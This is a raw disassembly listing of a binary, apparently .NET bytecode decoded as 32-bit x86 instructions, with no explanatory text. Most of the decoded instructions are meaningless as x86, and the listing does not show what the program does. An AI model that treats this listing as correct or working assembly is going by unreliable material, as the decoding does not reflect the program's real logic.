  4025be:	00 02                	add    %al,(%edx)
  4025c0:	72 92                	jb     0x402554
  4025c2:	0a 00                	or     (%eax),%al
  4025c4:	70 28                	jo     0x4025ee
  4025c6:	07                   	pop    %es
  4025c7:	00 00                	add    %al,(%eax)
  4025c9:	06                   	push   %es
  4025ca:	00 02                	add    %al,(%edx)
  4025cc:	72 e0                	jb     0x4025ae
  4025ce:	0a 00                	or     (%eax),%al
  4025d0:	70 28                	jo     0x4025fa
  4025d2:	07                   	pop    %es
  4025d3:	00 00                	add    %al,(%eax)
  4025d5:	06                   	push   %es
  4025d6:	00 00                	add    %al,(%eax)
  4025d8:	28 27                	sub    %ah,(%edi)
  4025da:	00 00                	add    %al,(%eax)
  4025dc:	0a 13                	or     (%ebx),%dl
  4025de:	2a 16                	sub    (%esi),%dl
  4025e0:	13 29                	adc    (%ecx),%ebp
  4025e2:	2b 1d 11 2a 11 29    	sub    0x29112a11,%ebx
  4025e8:	9a 13 24 00 02 11 24 	lcall  $0x2411,$0x2002413
  4025ef:	6f                   	outsl  %ds:(%esi),(%dx)
  4025f0:	28 00                	sub    %al,(%eax)
  4025f2:	00 0a                	add    %cl,(%edx)
  4025f4:	28 08                	sub    %cl,(%eax)
  4025f6:	00 00                	add    %al,(%eax)
  4025f8:	06                   	push   %es
  4025f9:	00 00                	add    %al,(%eax)
  4025fb:	11 29                	adc    %ebp,(%ecx)
  4025fd:	17                   	pop    %ss
  4025fe:	58                   	pop    %eax
  4025ff:	13 29                	adc    (%ecx),%ebp
  402601:	11 29                	adc    %ebp,(%ecx)
  402603:	11 2a                	adc    %ebp,(%edx)
  402605:	8e 69 fe             	mov    -0x2(%ecx),%gs
  402608:	04 13                	add    $0x13,%al
  40260a:	27                   	daa
  40260b:	11 27                	adc    %esp,(%edi)
  40260d:	2d d5 02 72 3c       	sub    $0x3c7202d5,%eax
  402612:	0b 00                	or     (%eax),%eax
  402614:	70 28                	jo     0x40263e
  402616:	07                   	pop    %es
  402617:	00 00                	add    %al,(%eax)
  402619:	06                   	push   %es
  40261a:	00 02                	add    %al,(%edx)
  40261c:	72 62                	jb     0x402680
  40261e:	0b 00                	or     (%eax),%eax
  402620:	70 28                	jo     0x40264a
  402622:	07                   	pop    %es
  402623:	00 00                	add    %al,(%eax)
  402625:	06                   	push   %es
  402626:	00 02                	add    %al,(%edx)
  402628:	72 b6                	jb     0x4025e0
  40262a:	0b 00                	or     (%eax),%eax
  40262c:	70 28                	jo     0x402656
  40262e:	07                   	pop    %es
  40262f:	00 00                	add    %al,(%eax)
  402631:	06                   	push   %es
  402632:	00 02                	add    %al,(%edx)
  402634:	72 30                	jb     0x402666
  402636:	0c 00                	or     $0x0,%al
  402638:	70 28                	jo     0x402662
  40263a:	07                   	pop    %es
  40263b:	00 00                	add    %al,(%eax)
  40263d:	06                   	push   %es
  40263e:	00 02                	add    %al,(%edx)
  402640:	72 9a                	jb     0x4025dc
  402642:	0c 00                	or     $0x0,%al
  402644:	70 28                	jo     0x40266e
  402646:	07                   	pop    %es
  402647:	00 00                	add    %al,(%eax)
  402649:	06                   	push   %es
  40264a:	00 02                	add    %al,(%edx)
  40264c:	72 12                	jb     0x402660
  40264e:	0d 00 70 28 07       	or     $0x7287000,%eax
  402653:	00 00                	add    %al,(%eax)
  402655:	06                   	push   %es
  402656:	00 02                	add    %al,(%edx)
  402658:	72 92                	jb     0x4025ec
  40265a:	0d 00 70 28 07       	or     $0x7287000,%eax
  40265f:	00 00                	add    %al,(%eax)
  402661:	06                   	push   %es
  402662:	00 02                	add    %al,(%edx)
  402664:	72 0e                	jb     0x402674
  402666:	0e                   	push   %cs
  402667:	00 70 28             	add    %dh,0x28(%eax)
  40266a:	07                   	pop    %es
  40266b:	00 00                	add    %al,(%eax)
  40266d:	06                   	push   %es
  40266e:	00 02                	add    %al,(%edx)
  402670:	72 27                	jb     0x402699
  402672:	0f 00                	(bad)
  402674:	70 28                	jo     0x40269e
  402676:	07                   	pop    %es
  402677:	00 00                	add    %al,(%eax)
  402679:	06                   	push   %es
  40267a:	00 02                	add    %al,(%edx)
  40267c:	72 40                	jb     0x4026be
  40267e:	10 00                	adc    %al,(%eax)
  402680:	70 28                	jo     0x4026aa
  402682:	07                   	pop    %es
  402683:	00 00                	add    %al,(%eax)
  402685:	06                   	push   %es
  402686:	00 02                	add    %al,(%edx)
  402688:	72 59                	jb     0x4026e3
  40268a:	11 00                	adc    %eax,(%eax)
  40268c:	70 28                	jo     0x4026b6
  40268e:	07                   	pop    %es
  40268f:	00 00                	add    %al,(%eax)
  402691:	06                   	push   %es
  402692:	00 02                	add    %al,(%edx)
  402694:	72 72                	jb     0x402708
  402696:	12 00                	adc    (%eax),%al
  402698:	70 28                	jo     0x4026c2
  40269a:	07                   	pop    %es
  40269b:	00 00                	add    %al,(%eax)
  40269d:	06                   	push   %es
  40269e:	00 02                	add    %al,(%edx)
  4026a0:	72 8b                	jb     0x40262d
  4026a2:	13 00                	adc    (%eax),%eax
  4026a4:	70 28                	jo     0x4026ce
  4026a6:	07                   	pop    %es
  4026a7:	00 00                	add    %al,(%eax)
  4026a9:	06                   	push   %es
  4026aa:	00 02                	add    %al,(%edx)
  4026ac:	72 a4                	jb     0x402652
  4026ae:	14 00                	adc    $0x0,%al
  4026b0:	70 28                	jo     0x4026da
  4026b2:	07                   	pop    %es
  4026b3:	00 00                	add    %al,(%eax)
  4026b5:	06                   	push   %es
  4026b6:	00 02                	add    %al,(%edx)
  4026b8:	72 bd                	jb     0x402677
  4026ba:	15 00 70 28 07       	adc    $0x7287000,%eax
  4026bf:	00 00                	add    %al,(%eax)
  4026c1:	06                   	push   %es
  4026c2:	00 02                	add    %al,(%edx)
  4026c4:	72 d6                	jb     0x40269c
  4026c6:	16                   	push   %ss
  4026c7:	00 70 28             	add    %dh,0x28(%eax)
  4026ca:	07                   	pop    %es
  4026cb:	00 00                	add    %al,(%eax)
  4026cd:	06                   	push   %es
  4026ce:	00 02                	add    %al,(%edx)
  4026d0:	72 ef                	jb     0x4026c1
  4026d2:	17                   	pop    %ss
  4026d3:	00 70 28             	add    %dh,0x28(%eax)
  4026d6:	07                   	pop    %es
  4026d7:	00 00                	add    %al,(%eax)
  4026d9:	06                   	push   %es
  4026da:	00 02                	add    %al,(%edx)
  4026dc:	72 08                	jb     0x4026e6
  4026de:	19 00                	sbb    %eax,(%eax)
  4026e0:	70 28                	jo     0x40270a
  4026e2:	07                   	pop    %es
  4026e3:	00 00                	add    %al,(%eax)
  4026e5:	06                   	push   %es
  4026e6:	00 02                	add    %al,(%edx)
  4026e8:	72 21                	jb     0x40270b
  4026ea:	1a 00                	sbb    (%eax),%al
  4026ec:	70 28                	jo     0x402716
  4026ee:	07                   	pop    %es
  4026ef:	00 00                	add    %al,(%eax)
  4026f1:	06                   	push   %es
  4026f2:	00 02                	add    %al,(%edx)
  4026f4:	72 77                	jb     0x40276d
  4026f6:	1a 00                	sbb    (%eax),%al
  4026f8:	70 28                	jo     0x402722
  4026fa:	07                   	pop    %es
  4026fb:	00 00                	add    %al,(%eax)
  4026fd:	06                   	push   %es
  4026fe:	00 02                	add    %al,(%edx)
  402700:	28 29                	sub    %ch,(%ecx)
  402702:	00 00                	add    %al,(%eax)
  402704:	0a 00                	or     (%eax),%al
  402706:	28 2a                	sub    %ch,(%edx)
  402708:	00 00                	add    %al,(%eax)
  40270a:	0a 00                	or     (%eax),%al
  40270c:	28 10                	sub    %dl,(%eax)
  40270e:	00 00                	add    %al,(%eax)
  402710:	0a 28                	or     (%eax),%ch
  402712:	11 00                	adc    %eax,(%eax)
  402714:	00 0a                	add    %cl,(%edx)
  402716:	13 25 38 4f 01 00    	adc    0x14f38,%esp
  40271c:	00 00                	add    %al,(%eax)
  40271e:	00 02                	add    %al,(%edx)
  402720:	08 28                	or     %ch,(%eax)
  402722:	03 00                	add    (%eax),%eax
  402724:	00 06                	add    %al,(%esi)
  402726:	00 02                	add    %al,(%edx)
  402728:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  40272b:	03 00                	add    (%eax),%eax
  40272d:	00 06                	add    %al,(%esi)
  40272f:	00 02                	add    %al,(%edx)
  402731:	09 28                	or     %ebp,(%eax)
  402733:	03 00                	add    (%eax),%eax
  402735:	00 06                	add    %al,(%esi)
  402737:	00 02                	add    %al,(%edx)
  402739:	11 05 28 03 00 00    	adc    %eax,0x328
  40273f:	06                   	push   %es
  402740:	00 02                	add    %al,(%edx)
  402742:	11 06                	adc    %eax,(%esi)
  402744:	28 03                	sub    %al,(%ebx)
  402746:	00 00                	add    %al,(%eax)
  402748:	06                   	push   %es
  402749:	00 02                	add    %al,(%edx)
  40274b:	08 28                	or     %ch,(%eax)
  40274d:	04 00                	add    $0x0,%al
  40274f:	00 06                	add    %al,(%esi)
  402751:	00 02                	add    %al,(%edx)
  402753:	11 04 28             	adc    %eax,(%eax,%ebp,1)
  402756:	04 00                	add    $0x0,%al
  402758:	00 06                	add    %al,(%esi)
  40275a:	00 02                	add    %al,(%edx)
  40275c:	09 28                	or     %ebp,(%eax)
  40275e:	04 00                	add    $0x0,%al
  402760:	00 06                	add    %al,(%esi)
  402762:	00 02                	add    %al,(%edx)
  402764:	11 05 28 04 00 00    	adc    %eax,0x428
  40276a:	06                   	push   %es
  40276b:	00 02                	add    %al,(%edx)
  40276d:	11 06                	adc    %eax,(%esi)
  40276f:	28 04 00             	sub    %al,(%eax,%eax,1)
  402772:	00 06                	add    %al,(%esi)
  402774:	00 02                	add    %al,(%edx)
  402776:	11 09                	adc    %ecx,(%ecx)
  402778:	28 03                	sub    %al,(%ebx)
  40277a:	00 00                	add    %al,(%eax)
  40277c:	06                   	push   %es
  40277d:	00 02                	add    %al,(%edx)
  40277f:	11 0a                	adc    %ecx,(%edx)
  402781:	28 03                	sub    %al,(%ebx)
  402783:	00 00                	add    %al,(%eax)
  402785:	06                   	push   %es
  402786:	00 02                	add    %al,(%edx)
  402788:	11 0b                	adc    %ecx,(%ebx)
  40278a:	28 03                	sub    %al,(%ebx)
  40278c:	00 00                	add    %al,(%eax)
  40278e:	06                   	push   %es
  40278f:	00 02                	add    %al,(%edx)
  402791:	11 0c 28             	adc    %ecx,(%eax,%ebp,1)
  402794:	03 00                	add    (%eax),%eax
  402796:	00 06                	add    %al,(%esi)
  402798:	00 02                	add    %al,(%edx)
  40279a:	11 0d 28 03 00 00    	adc    %ecx,0x328
  4027a0:	06                   	push   %es
  4027a1:	00 02                	add    %al,(%edx)
  4027a3:	11 0e                	adc    %ecx,(%esi)
  4027a5:	28 03                	sub    %al,(%ebx)
  4027a7:	00 00                	add    %al,(%eax)
  4027a9:	06                   	push   %es
  4027aa:	00 02                	add    %al,(%edx)
  4027ac:	11 0f                	adc    %ecx,(%edi)
  4027ae:	28 03                	sub    %al,(%ebx)
  4027b0:	00 00                	add    %al,(%eax)
  4027b2:	06                   	push   %es
  4027b3:	00 02                	add    %al,(%edx)
  4027b5:	11 10                	adc    %edx,(%eax)
  4027b7:	28 03                	sub    %al,(%ebx)
  4027b9:	00 00                	add    %al,(%eax)
  4027bb:	06                   	push   %es
  4027bc:	00 02                	add    %al,(%edx)
  4027be:	11 11                	adc    %edx,(%ecx)
  4027c0:	28 03                	sub    %al,(%ebx)
  4027c2:	00 00                	add    %al,(%eax)
  4027c4:	06                   	push   %es
  4027c5:	00 02                	add    %al,(%edx)
  4027c7:	11 12                	adc    %edx,(%edx)
  4027c9:	28 03                	sub    %al,(%ebx)
  4027cb:	00 00                	add    %al,(%eax)
  4027cd:	06                   	push   %es
  4027ce:	00 02                	add    %al,(%edx)
  4027d0:	11 13                	adc    %edx,(%ebx)
  4027d2:	28 03                	sub    %al,(%ebx)
  4027d4:	00 00                	add    %al,(%eax)
  4027d6:	06                   	push   %es
  4027d7:	00 02                	add    %al,(%edx)
  4027d9:	11 14 28             	adc    %edx,(%eax,%ebp,1)
  4027dc:	03 00                	add    (%eax),%eax
  4027de:	00 06                	add    %al,(%esi)
  4027e0:	00 02                	add    %al,(%edx)
  4027e2:	11 15 28 03 00 00    	adc    %edx,0x328
  4027e8:	06                   	push   %es
  4027e9:	00 02                	add    %al,(%edx)
  4027eb:	1f                   	pop    %ds
  4027ec:	1a 28                	sbb    (%eax),%ch
  4027ee:	1b 00                	sbb    (%eax),%eax
  4027f0:	00 0a                	add    %cl,(%edx)
  4027f2:	28 03                	sub    %al,(%ebx)
  4027f4:	00 00                	add    %al,(%eax)
  4027f6:	06                   	push   %es
  4027f7:	00 02                	add    %al,(%edx)
  4027f9:	1f                   	pop    %ds
  4027fa:	2e 28 1b             	sub    %bl,%cs:(%ebx)
  4027fd:	00 00                	add    %al,(%eax)
  4027ff:	0a 28                	or     (%eax),%ch
  402801:	03 00                	add    (%eax),%eax
  402803:	00 06                	add    %al,(%esi)
  402805:	00 02                	add    %al,(%edx)
  402807:	1f                   	pop    %ds
  402808:	36 28 1b             	sub    %bl,%ss:(%ebx)
  40280b:	00 00                	add    %al,(%eax)
  40280d:	0a 28                	or     (%eax),%ch
  40280f:	03 00                	add    (%eax),%eax
  402811:	00 06                	add    %al,(%esi)
  402813:	00 02                	add    %al,(%edx)
  402815:	1f                   	pop    %ds
  402816:	35 28 1b 00 00       	xor    $0x1b28,%eax
  40281b:	0a 28                	or     (%eax),%ch
  40281d:	03 00                	add    (%eax),%eax
  40281f:	00 06                	add    %al,(%esi)
  402821:	00 02                	add    %al,(%edx)
  402823:	1f                   	pop    %ds
  402824:	37                   	aaa
  402825:	28 1b                	sub    %bl,(%ebx)
  402827:	00 00                	add    %al,(%eax)
  402829:	0a 28                	or     (%eax),%ch
  40282b:	03 00                	add    (%eax),%eax
  40282d:	00 06                	add    %al,(%esi)
  40282f:	00 02                	add    %al,(%edx)
  402831:	1f                   	pop    %ds
  402832:	19 28                	sbb    %ebp,(%eax)
  402834:	1b 00                	sbb    (%eax),%eax
  402836:	00 0a                	add    %cl,(%edx)
  402838:	28 03                	sub    %al,(%ebx)
  40283a:	00 00                	add    %al,(%eax)
  40283c:	06                   	push   %es
  40283d:	00 7e 2b             	add    %bh,0x2b(%esi)
  402840:	00 00                	add    %al,(%eax)
  402842:	0a 11                	or     (%ecx),%dl
  402844:	25 28 2c 00 00       	and    $0x2c28,%eax
  402849:	0a 28                	or     (%eax),%ch
  40284b:	2d 00 00 0a 00       	sub    $0xa0000,%eax
  402850:	1f                   	pop    %ds
  402851:	28 28                	sub    %ch,(%eax)
  402853:	1b 00                	sbb    (%eax),%eax
  402855:	00 0a                	add    %cl,(%edx)
  402857:	13 26                	adc    (%esi),%esp
  402859:	02 11                	add    (%ecx),%dl
  40285b:	26 28 09             	sub    %cl,%es:(%ecx)
  40285e:	00 00                	add    %al,(%eax)
  402860:	06                   	push   %es
  402861:	00 00                	add    %al,(%eax)
  402863:	de 05 26 00 00 de    	fiadds 0xde000026
  402869:	00 00                	add    %al,(%eax)
  40286b:	00 17                	add    %dl,(%edi)
  40286d:	13 27                	adc    (%edi),%esp
  40286f:	38 a9 fe ff ff 26    	cmp    %ch,0x26fffffe(%ecx)
  402875:	00 00                	add    %al,(%eax)
  402877:	de 00                	fiadds (%eax)
  402879:	00 00                	add    %al,(%eax)
  40287b:	de 05 26 00 00 de    	fiadds 0xde000026
  402881:	00 00                	add    %al,(%eax)
  402883:	00 2a                	add    %ch,(%edx)
  402885:	00 00                	add    %al,(%eax)
  402887:	00 41 3c             	add    %al,0x3c(%ecx)
  40288a:	01 00                	add    %eax,(%eax)
  40288c:	00 00                	add    %al,(%eax)
  40288e:	00 00                	add    %al,(%eax)
  402890:	39 00                	cmp    %eax,(%eax)
  402892:	00 00                	add    %al,(%eax)
  402894:	24 00                	and    $0x0,%al
  402896:	00 00                	add    %al,(%eax)
  402898:	5d                   	pop    %ebp
  402899:	00 00                	add    %al,(%eax)
  40289b:	00 05 00 00 00 02    	add    %al,0x2000000
  4028a1:	00 00                	add    %al,(%eax)
  4028a3:	01 02                	add    %eax,(%edx)
  4028a5:	00 00                	add    %al,(%eax)
  4028a7:	00 38                	add    %bh,(%eax)
  4028a9:	00 00                	add    %al,(%eax)
  4028ab:	00 2e                	add    %ch,(%esi)
  4028ad:	00 00                	add    %al,(%eax)
  4028af:	00 66 00             	add    %ah,0x0(%esi)
  4028b2:	00 00                	add    %al,(%eax)
  4028b4:	12 00                	adc    (%eax),%al
	...
  4028be:	00 00                	add    %al,(%eax)
  4028c0:	8a 00                	mov    (%eax),%al
  4028c2:	00 00                	add    %al,(%eax)
  4028c4:	16                   	push   %ss
  4028c5:	00 00                	add    %al,(%eax)
  4028c7:	00 a0 00 00 00 05    	add    %ah,0x5000000(%eax)
  4028cd:	00 00                	add    %al,(%eax)
  4028cf:	00 02                	add    %al,(%edx)
  4028d1:	00 00                	add    %al,(%eax)
  4028d3:	01 02                	add    %eax,(%edx)
  4028d5:	00 00                	add    %al,(%eax)
  4028d7:	00 89 00 00 00 20    	add    %cl,0x20000000(%ecx)
  4028dd:	00 00                	add    %al,(%eax)
  4028df:	00 a9 00 00 00 12    	add    %ch,0x12000000(%ecx)
	...
  4028ed:	00 00                	add    %al,(%eax)
  4028ef:	00 84 03 00 00 14 00 	add    %al,0x140000(%ebx,%eax,1)
  4028f6:	00 00                	add    %al,(%eax)
  4028f8:	98                   	cwtl
  4028f9:	03 00                	add    (%eax),%eax
  4028fb:	00 05 00 00 00 02    	add    %al,0x2000000
  402901:	00 00                	add    %al,(%eax)
  402903:	01 00                	add    %eax,(%eax)
  402905:	00 00                	add    %al,(%eax)
  402907:	00 c5                	add    %al,%ch
  402909:	03 00                	add    (%eax),%eax
  40290b:	00 0d 00 00 00 d2    	add    %cl,0xd2000000
  402911:	03 00                	add    (%eax),%eax
  402913:	00 05 00 00 00 02    	add    %al,0x2000000
  402919:	00 00                	add    %al,(%eax)
  40291b:	01 00                	add    %eax,(%eax)
  40291d:	00 00                	add    %al,(%eax)
  40291f:	00 fc                	add    %bh,%ah
  402921:	03 00                	add    (%eax),%eax
  402923:	00 10                	add    %dl,(%eax)
  402925:	00 00                	add    %al,(%eax)
  402927:	00 0c 04             	add    %cl,(%esp,%eax,1)
  40292a:	00 00                	add    %al,(%eax)
  40292c:	05 00 00 00 02       	add    $0x2000000,%eax
  402931:	00 00                	add    %al,(%eax)
  402933:	01 00                	add    %eax,(%eax)
  402935:	00 00                	add    %al,(%eax)
  402937:	00 58 04             	add    %bl,0x4(%eax)
  40293a:	00 00                	add    %al,(%eax)
  40293c:	cc                   	int3
  40293d:	00 00                	add    %al,(%eax)
  40293f:	00 24 05 00 00 05 00 	add    %ah,0x50000(,%eax,1)
  402946:	00 00                	add    %al,(%eax)
  402948:	02 00                	add    (%eax),%al
  40294a:	00 01                	add    %al,(%ecx)
  40294c:	00 00                	add    %al,(%eax)
  40294e:	00 00                	add    %al,(%eax)
  402950:	40                   	inc    %eax
  402951:	04 00                	add    $0x0,%al
  402953:	00 ed                	add    %ch,%ch
  402955:	00 00                	add    %al,(%eax)
  402957:	00 2d 05 00 00 05    	add    %ch,0x5000005
  40295d:	00 00                	add    %al,(%eax)
  40295f:	00 02                	add    %al,(%edx)
  402961:	00 00                	add    %al,(%eax)
  402963:	01 02                	add    %eax,(%edx)
  402965:	00 00                	add    %al,(%eax)
  402967:	00 3f                	add    %bh,(%edi)
  402969:	04 00                	add    $0x0,%al
  40296b:	00 f7                	add    %dh,%bh
  40296d:	00 00                	add    %al,(%eax)
  40296f:	00 36                	add    %dh,(%esi)
  402971:	05 00 00 14 00       	add    $0x140000,%eax
	...
  40297e:	00 00                	add    %al,(%eax)
  402980:	c2 06 00             	ret    $0x6
  402983:	00 47 01             	add    %al,0x1(%edi)
  402986:	00 00                	add    %al,(%eax)
  402988:	09 08                	or     %ecx,(%eax)
  40298a:	00 00                	add    %al,(%eax)
  40298c:	05 00 00 00 02       	add    $0x2000000,%eax
  402991:	00 00                	add    %al,(%eax)
  402993:	01 00                	add    %eax,(%eax)
  402995:	00 00                	add    %al,(%eax)
  402997:	00 c5                	add    %al,%ch
  402999:	00 00                	add    %al,(%eax)
  40299b:	00 53 07             	add    %dl,0x7(%ebx)
  40299e:	00 00                	add    %al,(%eax)
  4029a0:	18 08                	sbb    %cl,(%eax)
  4029a2:	00 00                	add    %al,(%eax)
  4029a4:	05 00 00 00 02       	add    $0x2000000,%eax
  4029a9:	00 00                	add    %al,(%eax)
  4029ab:	01 00                	add    %eax,(%eax)
  4029ad:	00 00                	add    %al,(%eax)
  4029af:	00 1f                	add    %bl,(%edi)
  4029b1:	00 00                	add    %al,(%eax)
  4029b3:	00 02                	add    %al,(%edx)
  4029b5:	08 00                	or     %al,(%eax)
  4029b7:	00 21                	add    %ah,(%ecx)
  4029b9:	08 00                	or     %al,(%eax)
  4029bb:	00 05 00 00 00 02    	add    %al,0x2000000
  4029c1:	00 00                	add    %al,(%eax)
  4029c3:	01 1b                	add    %ebx,(%ebx)
  4029c5:	30 03                	xor    %al,(%ebx)
  4029c7:	00 38                	add    %bh,(%eax)
  4029c9:	01 00                	add    %eax,(%eax)
  4029cb:	00 02                	add    %al,(%edx)
  4029cd:	00 00                	add    %al,(%eax)
  4029cf:	11 00                	adc    %eax,(%eax)
  4029d1:	00 03                	add    %al,(%ebx)
  4029d3:	72 73                	jb     0x402a48
  4029d5:	00 00                	add    %al,(%eax)
  4029d7:	70 28                	jo     0x402a01
  4029d9:	21 00                	and    %eax,(%eax)
  4029db:	00 0a                	add    %cl,(%edx)
  4029dd:	72 eb                	jb     0x4029ca
  4029df:	1a 00                	sbb    (%eax),%al
  4029e1:	70 17                	jo     0x4029fa
  4029e3:	28 2e                	sub    %ch,(%esi)
  4029e5:	00 00                	add    %al,(%eax)
  4029e7:	0a 0a                	or     (%edx),%cl
  4029e9:	03 72 73             	add    0x73(%edx),%esi
  4029ec:	00 00                	add    %al,(%eax)
  4029ee:	70 28                	jo     0x402a18
  4029f0:	21 00                	and    %eax,(%eax)
  4029f2:	00 0a                	add    %cl,(%edx)
  4029f4:	72 f7                	jb     0x4029ed
  4029f6:	1a 00                	sbb    (%eax),%al
  4029f8:	70 17                	jo     0x402a11
  4029fa:	28 2e                	sub    %ch,(%esi)
  4029fc:	00 00                	add    %al,(%eax)
  4029fe:	0a 0b                	or     (%ebx),%cl
  402a00:	03 72 73             	add    0x73(%edx),%esi
  402a03:	00 00                	add    %al,(%eax)
  402a05:	70 28                	jo     0x402a2f
  402a07:	21 00                	and    %eax,(%eax)
  402a09:	00 0a                	add    %cl,(%edx)
  402a0b:	72 03                	jb     0x402a10
  402a0d:	1b 00                	sbb    (%eax),%eax
  402a0f:	70 17                	jo     0x402a28
  402a11:	28 2e                	sub    %ch,(%esi)
  402a13:	00 00                	add    %al,(%eax)
  402a15:	0a 0c 03             	or     (%ebx,%eax,1),%cl
  402a18:	72 73                	jb     0x402a8d
  402a1a:	00 00                	add    %al,(%eax)
  402a1c:	70 28                	jo     0x402a46
  402a1e:	21 00                	and    %eax,(%eax)
  402a20:	00 0a                	add    %cl,(%edx)
  402a22:	72 0f                	jb     0x402a33
  402a24:	1b 00                	sbb    (%eax),%eax
  402a26:	70 17                	jo     0x402a3f
  402a28:	28 2e                	sub    %ch,(%esi)
  402a2a:	00 00                	add    %al,(%eax)
  402a2c:	0a 0d 16 13 04 2b    	or     0x2b041316,%cl
  402a32:	22 00                	and    (%eax),%al
  402a34:	00 06                	add    %al,(%esi)
  402a36:	11 04 9a             	adc    %eax,(%edx,%ebx,4)
  402a39:	02 7b 01             	add    0x1(%ebx),%bh
  402a3c:	00 00                	add    %al,(%eax)
  402a3e:	04 28                	add    $0x28,%al
  402a40:	2f                   	das
  402a41:	00 00                	add    %al,(%eax)
  402a43:	0a 00                	or     (%eax),%al
  402a45:	00 de                	add    %bl,%dh
  402a47:	05 26 00 00 de       	add    $0xde000026,%eax
  402a4c:	00 00                	add    %al,(%eax)
  402a4e:	00 11                	add    %dl,(%ecx)
  402a50:	04 17                	add    $0x17,%al
  402a52:	d6                   	salc
  402a53:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402a56:	04 06                	add    $0x6,%al
  402a58:	8e 69 fe             	mov    -0x2(%ecx),%gs
  402a5b:	04 13                	add    $0x13,%al
  402a5d:	05 11 05 2d d1       	add    $0xd12d0511,%eax
  402a62:	16                   	push   %ss
  402a63:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  402a66:	22 00                	and    (%eax),%al
  402a68:	00 07                	add    %al,(%edi)
  402a6a:	11 04 9a             	adc    %eax,(%edx,%ebx,4)
  402a6d:	02 7b 01             	add    0x1(%ebx),%bh
  402a70:	00 00                	add    %al,(%eax)
  402a72:	04 28                	add    $0x28,%al
  402a74:	2f                   	das
  402a75:	00 00                	add    %al,(%eax)
  402a77:	0a 00                	or     (%eax),%al
  402a79:	00 de                	add    %bl,%dh
  402a7b:	05 26 00 00 de       	add    $0xde000026,%eax
  402a80:	00 00                	add    %al,(%eax)
  402a82:	00 11                	add    %dl,(%ecx)
  402a84:	04 17                	add    $0x17,%al
  402a86:	d6                   	salc
  402a87:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402a8a:	04 07                	add    $0x7,%al
  402a8c:	8e 69 fe             	mov    -0x2(%ecx),%gs
  402a8f:	04 13                	add    $0x13,%al
  402a91:	05 11 05 2d d1       	add    $0xd12d0511,%eax
  402a96:	16                   	push   %ss
  402a97:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  402a9a:	22 00                	and    (%eax),%al
  402a9c:	00 08                	add    %cl,(%eax)
  402a9e:	11 04 9a             	adc    %eax,(%edx,%ebx,4)
  402aa1:	02 7b 01             	add    0x1(%ebx),%bh
  402aa4:	00 00                	add    %al,(%eax)
  402aa6:	04 28                	add    $0x28,%al
  402aa8:	2f                   	das
  402aa9:	00 00                	add    %al,(%eax)
  402aab:	0a 00                	or     (%eax),%al
  402aad:	00 de                	add    %bl,%dh
  402aaf:	05 26 00 00 de       	add    $0xde000026,%eax
  402ab4:	00 00                	add    %al,(%eax)
  402ab6:	00 11                	add    %dl,(%ecx)
  402ab8:	04 17                	add    $0x17,%al
  402aba:	d6                   	salc
  402abb:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402abe:	04 08                	add    $0x8,%al
  402ac0:	8e 69 fe             	mov    -0x2(%ecx),%gs
  402ac3:	04 13                	add    $0x13,%al
  402ac5:	05 11 05 2d d1       	add    $0xd12d0511,%eax
  402aca:	16                   	push   %ss
  402acb:	13 04 2b             	adc    (%ebx,%ebp,1),%eax
  402ace:	22 00                	and    (%eax),%al
  402ad0:	00 09                	add    %cl,(%ecx)
  402ad2:	11 04 9a             	adc    %eax,(%edx,%ebx,4)
  402ad5:	02 7b 01             	add    0x1(%ebx),%bh
  402ad8:	00 00                	add    %al,(%eax)
  402ada:	04 28                	add    $0x28,%al
  402adc:	2f                   	das
  402add:	00 00                	add    %al,(%eax)
  402adf:	0a 00                	or     (%eax),%al
  402ae1:	00 de                	add    %bl,%dh
  402ae3:	05 26 00 00 de       	add    $0xde000026,%eax
  402ae8:	00 00                	add    %al,(%eax)
  402aea:	00 11                	add    %dl,(%ecx)
  402aec:	04 17                	add    $0x17,%al
  402aee:	d6                   	salc
  402aef:	13 04 11             	adc    (%ecx,%edx,1),%eax
  402af2:	04 09                	add    $0x9,%al
  402af4:	8e 69 fe             	mov    -0x2(%ecx),%gs
  402af7:	04 13                	add    $0x13,%al
  402af9:	05 11 05 2d d1       	add    $0xd12d0511,%eax
  402afe:	00 de                	add    %bl,%dh
  402b00:	05 26 00 00 de       	add    $0xde000026,%eax
  402b05:	00 00                	add    %al,(%eax)
  402b07:	2a 41 7c             	sub    0x7c(%ecx),%al
  402b0a:	00 00                	add    %al,(%eax)
  402b0c:	00 00                	add    %al,(%eax)
  402b0e:	00 00                	add    %al,(%eax)
  402b10:	64 00 00             	add    %al,%fs:(%eax)
  402b13:	00 14 00             	add    %dl,(%eax,%eax,1)
  402b16:	00 00                	add    %al,(%eax)
  402b18:	78 00                	js     0x402b1a
  402b1a:	00 00                	add    %al,(%eax)
  402b1c:	05 00 00 00 02       	add    $0x2000000,%eax
  402b21:	00 00                	add    %al,(%eax)
  402b23:	01 00                	add    %eax,(%eax)
  402b25:	00 00                	add    %al,(%eax)
  402b27:	00 98 00 00 00 14    	add    %bl,0x14000000(%eax)
  402b2d:	00 00                	add    %al,(%eax)
  402b2f:	00 ac 00 00 00 05 00 	add    %ch,0x50000(%eax,%eax,1)
  402b36:	00 00                	add    %al,(%eax)
  402b38:	02 00                	add    (%eax),%al
  402b3a:	00 01                	add    %al,(%ecx)
  402b3c:	00 00                	add    %al,(%eax)
  402b3e:	00 00                	add    %al,(%eax)
  402b40:	cc                   	int3
  402b41:	00 00                	add    %al,(%eax)
  402b43:	00 14 00             	add    %dl,(%eax,%eax,1)
  402b46:	00 00                	add    %al,(%eax)
  402b48:	e0 00                	loopne 0x402b4a
  402b4a:	00 00                	add    %al,(%eax)
  402b4c:	05 00 00 00 02       	add    $0x2000000,%eax
  402b51:	00 00                	add    %al,(%eax)
  402b53:	01 00                	add    %eax,(%eax)
  402b55:	00 00                	add    %al,(%eax)
  402b57:	00 00                	add    %al,(%eax)
  402b59:	01 00                	add    %eax,(%eax)
  402b5b:	00 14 00             	add    %dl,(%eax,%eax,1)
  402b5e:	00 00                	add    %al,(%eax)
  402b60:	14 01                	adc    $0x1,%al
  402b62:	00 00                	add    %al,(%eax)
  402b64:	05 00 00 00 02       	add    $0x2000000,%eax
  402b69:	00 00                	add    %al,(%eax)
  402b6b:	01 00                	add    %eax,(%eax)
  402b6d:	00 00                	add    %al,(%eax)
  402b6f:	00 01                	add    %al,(%ecx)
  402b71:	00 00                	add    %al,(%eax)
